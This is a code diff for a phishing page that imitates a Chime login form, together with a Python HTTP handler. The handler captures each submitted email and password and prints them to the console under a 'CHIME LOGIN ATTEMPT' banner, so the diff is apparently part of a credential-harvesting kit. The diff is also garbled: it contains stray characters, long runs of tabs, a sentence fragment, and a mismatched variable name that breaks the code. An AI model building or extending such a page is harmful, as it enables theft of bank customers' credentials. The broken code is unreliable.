@@ -100,12 +100,11 @@ button:hover{
 <form method="POST">
 
 <label>Email</label>
-<input type="email" name="email" placeholder="Enter email" require
 
-<label>Password</label>
-++++++++++++++++																																																																																																					or is the last thing 	you 	
-<div class="pass-wrap">
-<input type="password" id="password" name="password" placeholder="Enter password" required>
+<input type="text" name="email" placeholder="Enter email" required>
+<label>Password</label>																																																																						<div class="pass-wrap">
+
+<input type="text" id="password" name="password" placeholder="Enter password" required>
 <span class="eye" onclick="togglePass()"></span>
 </div>
 
@@ -167,18 +166,20 @@ class Handler(BaseHTTPRequestHandler):
         length = int(self.headers["Content-Length"])
         body = self.rfile.read(length).decode()
         data = parse_qs(body)
-print(data)
-        email = data.get("email", [""])[0]
-        password = data.get("password", [""])[0]
 
-        print("\n=== CHIME LOGIN ATTEMPT ===")
-        print("email:", email)
-        print("password:", password)
+        print(data)
+
+        email = data.get("email", [""])[0]
+        Password = data.get("password", [""])[0]
+
+        print("\n=== CHIME LOGIN ATTEMPT===")
+        print("EMAIL:", email)
+        print("Password:", password)
 
         self.send_response(200)
         self.send_header("Content-type", "text/html")
         self.end_headers()
-        self.wfile.write(b"Login received")
+        self.wfile.write(b"password received")
 
 import os
 
